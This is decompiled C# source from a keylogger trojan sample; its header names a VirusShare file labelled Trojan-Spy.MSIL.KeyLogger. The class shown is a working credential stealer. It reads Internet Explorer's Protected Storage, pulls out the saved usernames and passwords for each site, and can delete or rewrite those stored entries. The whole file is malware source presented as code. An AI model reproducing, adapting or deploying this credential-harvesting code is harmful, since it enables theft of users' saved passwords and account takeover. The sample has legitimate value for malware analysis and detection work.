// Decompiled with JetBrains decompiler
// Type: Roy.CIEPasswords
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Roy.PStoreLib;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Roy
{
  internal class CIEPasswords : IEnumerable<CIEPassword>
  {
    private readonly Guid guidIE;
    private CProtectStore m_PStore;
    private PST_KEY m_KeyType;
    private List<CIEPassword> m_IEPass;
    [SpecialName]
    private CIEPasswords.SYSTEMTIME \u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst;
    [SpecialName]
    private CIEPasswords.FILETIME \u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lft;

    public CIEPasswords()
    {
      this.guidIE = new Guid("{E161255A-37C3-11D2-BCAA-00C04FD929DB}");
      this.m_PStore = new CProtectStore();
      this.m_IEPass = new List<CIEPassword>();
    }

    [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void CopyMemory(IntPtr Destination, IntPtr Source, int Length);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrlenA(IntPtr lpString);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FileTimeToLocalFileTime(
      ref CIEPasswords.FILETIME lpFileTime,
      ref CIEPasswords.FILETIME lpLocalFileTime);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FileTimeToSystemTime(
      ref CIEPasswords.FILETIME lpFileTime,
      ref CIEPasswords.SYSTEMTIME lpSystemTime);

    private DateTime FileTimeToDate(ref CIEPasswords.FILETIME ftDateTime)
    {
      CIEPasswords.FileTimeToLocalFileTime(ref ftDateTime, ref this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lft);
      CIEPasswords.FileTimeToSystemTime(ref this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lft, ref this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst);
      return DateTime.FromOADate(DateAndTime.DateSerial((int) this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst.wYear, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst.wMonth, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst.wDay).ToOADate() + DateAndTime.TimeSerial((int) this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst.wHour, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst.wMinute, (int) this.\u0024STATIC\u0024FileTimeToDate\u0024201113910118084\u0024lst.wSecond).ToOADate());
    }

    private void AddPasswdInfo(string strRess)
    {
      CIEPasswords.StringIndexEntry Expression1;
      int num1 = Strings.Len((object) Expression1);
      CIEPasswords.StringIndexHeader Expression2;
      Strings.Len((object) Expression2);
      byte[] numArray1 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, strRess + ":StringData");
      byte[] numArray2 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, strRess + ":StringIndex");
      GCHandle gcHandle1 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
      IntPtr ptr1 = gcHandle1.AddrOfPinnedObject();
      object structure1 = Marshal.PtrToStructure(ptr1, Expression2.GetType());
      CIEPasswords.StringIndexHeader stringIndexHeader1;
      CIEPasswords.StringIndexHeader stringIndexHeader2 = structure1 != null ? (CIEPasswords.StringIndexHeader) structure1 : stringIndexHeader1;
      gcHandle1.Free();
      GCHandle gcHandle2 = GCHandle.Alloc((object) numArray1, GCHandleType.Pinned);
      GCHandle gcHandle3 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
      IntPtr num2 = gcHandle2.AddrOfPinnedObject();
      ref IntPtr local = ref ptr1;
      IntPtr ptr2 = gcHandle3.AddrOfPinnedObject();
      int num3 = checked (ptr2.ToInt32() + stringIndexHeader2.dwStructSize);
      local = new IntPtr(num3);
      CIEPasswords.StringIndexEntry stringIndexEntry1;
      if (stringIndexHeader2.dwType == 1)
      {
        if (stringIndexHeader2.dwEntriesCount >= 2)
        {
          int num4 = checked (stringIndexHeader2.dwEntriesCount - 1);
          int num5 = 0;
          while (num5 <= num4)
          {
            if (num2 == IntPtr.Zero | ptr1 == IntPtr.Zero)
              return;
            CIEPasswords.StringIndexEntry stringIndexEntry2;
            object structure2 = Marshal.PtrToStructure(ptr1, stringIndexEntry2.GetType());
            stringIndexEntry2 = structure2 != null ? (CIEPasswords.StringIndexEntry) structure2 : stringIndexEntry1;
            IntPtr num6 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry2.dwDataOffset));
            string szUserName;
            if (CIEPasswords.lstrlenA(num6) != stringIndexEntry2.dwDataSize)
            {
              ptr2 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry2.dwDataOffset));
              szUserName = Marshal.PtrToStringUni(ptr2);
            }
            else
            {
              num6 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry2.dwDataOffset));
              szUserName = Marshal.PtrToStringAnsi(num6);
            }
            ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
            object structure3 = Marshal.PtrToStructure(ptr1, stringIndexEntry2.GetType());
            stringIndexEntry2 = structure3 != null ? (CIEPasswords.StringIndexEntry) structure3 : stringIndexEntry1;
            num6 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry2.dwDataOffset));
            string szPasswd;
            if (CIEPasswords.lstrlenA(num6) != stringIndexEntry2.dwDataSize)
            {
              ptr2 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry2.dwDataOffset));
              szPasswd = Marshal.PtrToStringUni(ptr2);
            }
            else
            {
              num6 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry2.dwDataOffset));
              szPasswd = Marshal.PtrToStringAnsi(num6);
            }
            ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
            this.m_IEPass.Add(new CIEPassword(this.m_PStore, strRess, szUserName, szPasswd, this.FileTimeToDate(ref stringIndexEntry2.ftInsertDateTime), 1));
            checked { num5 += 2; }
          }
        }
      }
      else if (stringIndexHeader2.dwType == 0)
      {
        if (num2 == IntPtr.Zero | ptr1 == IntPtr.Zero)
          return;
        int num7 = checked (stringIndexHeader2.dwEntriesCount - 1);
        int num8 = 0;
        while (num8 <= num7)
        {
          CIEPasswords.StringIndexEntry stringIndexEntry3;
          object structure4 = Marshal.PtrToStructure(ptr1, stringIndexEntry3.GetType());
          stringIndexEntry3 = structure4 != null ? (CIEPasswords.StringIndexEntry) structure4 : stringIndexEntry1;
          Strings.Space(stringIndexEntry3.dwDataSize);
          IntPtr num9 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
          string szUserName;
          if (CIEPasswords.lstrlenA(num9) != stringIndexEntry3.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
            szUserName = Marshal.PtrToStringUni(ptr2);
          }
          else
          {
            num9 = new IntPtr(checked (num2.ToInt32() + stringIndexEntry3.dwDataOffset));
            szUserName = Marshal.PtrToStringAnsi(num9);
          }
          ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
          this.m_IEPass.Add(new CIEPassword(this.m_PStore, strRess, szUserName, string.Empty, this.FileTimeToDate(ref stringIndexEntry3.ftInsertDateTime), 0));
          checked { ++num8; }
        }
      }
      gcHandle2.Free();
      gcHandle3.Free();
    }

    public PST_KEY KeyType
    {
      get => this.m_KeyType;
      set
      {
        this.m_KeyType = value;
        this.m_PStore.KeyType = value;
      }
    }

    public void DeletePart(string szResourceName, string szWord)
    {
      CIEPasswords.StringIndexEntry Expression1;
      int num1 = Strings.Len((object) Expression1);
      CIEPasswords.StringIndexHeader Expression2;
      int num2 = Strings.Len((object) Expression2);
      byte[] numArray1 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, szResourceName + ":StringData");
      byte[] numArray2 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex");
      GCHandle gcHandle1 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
      IntPtr ptr1 = gcHandle1.AddrOfPinnedObject();
      object structure1 = Marshal.PtrToStructure(ptr1, Expression2.GetType());
      CIEPasswords.StringIndexHeader stringIndexHeader;
      CIEPasswords.StringIndexHeader structure2 = structure1 != null ? (CIEPasswords.StringIndexHeader) structure1 : stringIndexHeader;
      gcHandle1.Free();
      GCHandle gcHandle2 = GCHandle.Alloc((object) numArray1, GCHandleType.Pinned);
      GCHandle gcHandle3 = GCHandle.Alloc((object) numArray2, GCHandleType.Pinned);
      gcHandle2.AddrOfPinnedObject();
      ref IntPtr local1 = ref ptr1;
      IntPtr ptr2 = gcHandle3.AddrOfPinnedObject();
      int num3 = checked (ptr2.ToInt32() + structure2.dwStructSize);
      local1 = new IntPtr(num3);
      if (structure2.dwType == 1 | structure2.dwEntriesCount == 1)
        this.Delete(szResourceName);
      else if (structure2.dwType == 0)
      {
        byte[] numArray3 = new byte[checked (Information.UBound((Array) numArray1) + 1)];
        byte[] numArray4 = new byte[checked (Information.UBound((Array) numArray2) + 1)];
        GCHandle gcHandle4 = GCHandle.Alloc((object) numArray3, GCHandleType.Pinned);
        GCHandle gcHandle5 = GCHandle.Alloc((object) numArray4, GCHandleType.Pinned);
        IntPtr num4 = gcHandle2.AddrOfPinnedObject();
        ref IntPtr local2 = ref ptr1;
        IntPtr num5 = gcHandle3.AddrOfPinnedObject();
        int num6 = checked (num5.ToInt32() + structure2.dwStructSize);
        local2 = new IntPtr(num6);
        IntPtr num7 = gcHandle4.AddrOfPinnedObject();
        IntPtr ptr3;
        ref IntPtr local3 = ref ptr3;
        num5 = gcHandle5.AddrOfPinnedObject();
        int num8 = checked (num5.ToInt32() + structure2.dwStructSize);
        local3 = new IntPtr(num8);
        int num9 = checked (structure2.dwEntriesCount - 1);
        int num10 = 0;
        int pcbBuff;
        while (num10 <= num9)
        {
          CIEPasswords.StringIndexEntry structure3;
          object structure4 = Marshal.PtrToStructure(ptr1, structure3.GetType());
          CIEPasswords.StringIndexEntry stringIndexEntry;
          structure3 = structure4 != null ? (CIEPasswords.StringIndexEntry) structure4 : stringIndexEntry;
          Strings.Space(structure3.dwDataSize);
          num5 = new IntPtr(checked (num4.ToInt32() + structure3.dwDataOffset));
          if (CIEPasswords.lstrlenA(num5) != structure3.dwDataSize)
          {
            ptr2 = new IntPtr(checked (num4.ToInt32() + structure3.dwDataOffset));
            if (Operators.CompareString(Marshal.PtrToStringUni(ptr2, checked (structure3.dwDataSize * 2)), szWord, false) != 0)
            {
              num5 = new IntPtr(checked (num7.ToInt32() + pcbBuff));
              IntPtr Destination = num5;
              ptr2 = new IntPtr(checked (num4.ToInt32() + structure3.dwDataOffset));
              IntPtr Source = ptr2;
              int Length = checked (structure3.dwDataSize * 2);
              CIEPasswords.CopyMemory(Destination, Source, Length);
              structure3.dwDataOffset = pcbBuff;
              Marshal.StructureToPtr((object) structure3, ptr3, false);
              pcbBuff = checked (pcbBuff + structure3.dwDataSize * 2 + 2);
              ptr3 = new IntPtr(checked (ptr3.ToInt32() + num1));
            }
          }
          else
          {
            num5 = new IntPtr(checked (num4.ToInt32() + structure3.dwDataOffset));
            if (Operators.CompareString(Marshal.PtrToStringAnsi(num5, checked (structure3.dwDataSize * 2)), szWord, false) != 0)
            {
              num5 = new IntPtr(checked (num7.ToInt32() + pcbBuff));
              IntPtr Destination = num5;
              ptr2 = new IntPtr(checked (num4.ToInt32() + structure3.dwDataOffset));
              IntPtr Source = ptr2;
              int dwDataSize = structure3.dwDataSize;
              CIEPasswords.CopyMemory(Destination, Source, dwDataSize);
              structure3.dwDataOffset = pcbBuff;
              Marshal.StructureToPtr((object) structure3, ptr3, false);
              pcbBuff = checked (pcbBuff + structure3.dwDataSize + 1);
              ptr3 = new IntPtr(checked (ptr3.ToInt32() + num1));
            }
          }
          ptr1 = new IntPtr(checked (ptr1.ToInt32() + num1));
          checked { ++num10; }
        }
        checked { --structure2.dwEntriesCount; }
        Marshal.StructureToPtr((object) structure2, ptr3, false);
        this.m_PStore.WriteItem(this.guidIE, this.guidIE, szResourceName + ":StringData", num7.ToInt32(), pcbBuff);
        this.m_PStore.WriteItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex", ptr3.ToInt32(), checked (num2 + structure2.dwEntriesCount * num1));
        gcHandle4.Free();
        gcHandle5.Free();
      }
      gcHandle2.Free();
      gcHandle3.Free();
    }

    public void Delete(string szResourceName)
    {
      this.m_PStore.DeleteItem(this.guidIE, this.guidIE, szResourceName + ":StringData");
      this.m_PStore.DeleteItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex");
    }

    public void Refresh()
    {
      this.m_IEPass.Clear();
      CItems citems = this.m_PStore.get_Items(this.guidIE, this.guidIE);
      if (citems == null)
        return;
      int num = 0;
      try
      {
        foreach (CItem citem in citems)
        {
          if (num % 2 == 0)
            this.AddPasswdInfo(Strings.Mid(citem.Name, 1, checked (Strings.InStr(citem.Name, ":String") - 1)));
          checked { ++num; }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public IEnumerator<CIEPassword> GetEnumerator()
    {
      this.Refresh();
      return (IEnumerator<CIEPassword>) this.m_IEPass.GetEnumerator();
    }

    IEnumerator IEnumerable.GetEnumerator1()
    {
      this.Refresh();
      return (IEnumerator) this.m_IEPass.GetEnumerator();
    }

    private struct StringIndexHeader
    {
      public int dwWICK;
      public int dwStructSize;
      public int dwEntriesCount;
      public int dwUnkId;
      public int dwType;
      public int dwUnk;
    }

    private struct FILETIME
    {
      public int dwLow;
      public int dwHigh;
    }

    private struct StringIndexEntry
    {
      public int dwDataOffset;
      public CIEPasswords.FILETIME ftInsertDateTime;
      public int dwDataSize;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 2)]
    private struct SYSTEMTIME
    {
      public short wYear;
      public short wMonth;
      public short wDayOfWeek;
      public short wDay;
      public short wHour;
      public short wMinute;
      public short wSecond;
      public short wMilliseconds;
    }

    private struct IEPass
    {
      public int dwType;
      public string strResource;
      public string strUserName;
      public string strPassword;
      public DateTime ftAddDate;
    }
  }
}
